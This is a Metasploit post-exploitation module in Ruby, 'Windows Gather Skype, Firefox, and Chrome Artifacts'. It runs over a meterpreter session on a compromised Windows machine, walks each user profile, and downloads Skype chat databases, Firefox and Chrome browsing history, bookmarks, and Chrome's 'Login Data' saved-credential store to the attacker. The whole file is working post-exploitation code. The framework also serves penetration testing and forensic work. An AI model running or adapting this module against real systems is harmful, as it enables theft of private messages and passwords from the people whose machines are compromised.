##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'csv'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'


class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
        'Description' => %q{Gathers Skype chat logs, Firefox history, and Chrome history data from the victim machine.},
        'License' => MSF_LICENSE,
        'Author' => [ 'Joshua Harper (@JonValt) <josh at radixtx dot com>'],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  def run
    print_status("Gathering user profiles")
    grab_user_profiles.each do |userprofile|
      if check_artifact({
            :path=>userprofile['AppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"skype",
            :artifact_dir=>"Skype"
          })
        download_artifact({
            :path=>"AppData",
            :profile=>userprofile,
            :artifact_name=>"skype",
            :artifact_dir=>"Skype",
            :artifact_filename=>"main.db",
            :artifact_filetype=>"binary/db"
          })
      end
      if check_artifact({
            :path=>userprofile['AppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"Firefox",
            :artifact_dir=>"Mozilla"
          })
        download_artifact({:path=>"AppData",
            :profile=>userprofile,
            :artifact_name=>"Firefox",
            :artifact_dir=>"Mozilla",
            :artifact_filename=>"places.sqlite",
            :artifact_filetype=>"binary/db"
          })
      end
      if check_artifact({
            :path=>userprofile['LocalAppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"Chrome History",
            :artifact_dir=>"Google"
          })
        download_artifact({
            :path=>"LocalAppData",
            :profile=>userprofile,
            :artifact_name=>"Chrome_History",
            :artifact_dir=>"Google",
            :artifact_filename=>"History.",
            :artifact_filetype=>"binary/db"
          })
      end
      if check_artifact({
            :path=>userprofile['LocalAppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"Chrome History",
            :artifact_dir=>"Google"
          })
        download_artifact({
            :path=>"LocalAppData",
            :profile=>userprofile,
            :artifact_name=>"Chrome_History",
            :artifact_dir=>"Google",
            :artifact_filename=>"Login Data.",
            :artifact_filetype=>"binary/db"
          })
      end
      if check_artifact({
            :path=>userprofile['LocalAppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"Chrome History",
            :artifact_dir=>"Google"
          })
        download_artifact({
            :path=>"LocalAppData",
            :profile=>userprofile,
            :artifact_name=>"Chrome_History",
            :artifact_dir=>"Google",
            :artifact_filename=>"Archived History.",
            :artifact_filetype=>"binary/db"
          })
      end
      if check_artifact({
            :path=>userprofile['LocalAppData'],
            :user=>userprofile['UserName'],
            :artifact_name=>"Chrome History",
            :artifact_dir=>"Google"
          })
        download_artifact({
            :path=>"LocalAppData",
            :profile=>userprofile,
            :artifact_name=>"Chrome_History",
            :artifact_dir=>"Google",
            :artifact_filename=>"Bookmarks.",
            :artifact_filetype=>"binary/db"
          })
      end
    end
  end

  def check_artifact(opts={})
    print_status("Checking for #{opts[:artifact_name]} artifacts...")
    dirs = []
    session.fs.dir.foreach(opts[:path]) do |d|
      dirs << d
    end
    dirs.each do |dir|
      if dir == opts[:artifact_dir]
        print_good("#{opts[:artifact_name]} directory found for #{opts[:user]}")
        return true
      end
    end
    print_good("#{opts[:artifact_name]} directory not found for #{opts[:user]}")
    return false
  end

  def download_artifact(opts={})
    file = session.fs.file.search("#{opts[:profile]["#{opts[:path]}"]}\\#{opts[:artifact_dir]}","#{opts[:artifact_filename]}",true)
    file.each do |db|
      guid = db['path'].split ('\\')
      # Using store_local for full control of output filename.  Forensics software can be picky about the files it's given.
      file_loc = store_local("artifact","#{opts[:artifact_filetype]}",session,"#{opts[:profile]['UserName']}_#{opts[:artifact_name]}_#{guid.last}_#{opts[:artifact_filename]}")
      maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
      print_status("Downloading #{maindb}")
      session.fs.file.download_file(file_loc,maindb)
      print_good("#{opts[:artifact_name]} artifact file saved to #{file_loc}")
      return file_loc
    end
  end
end
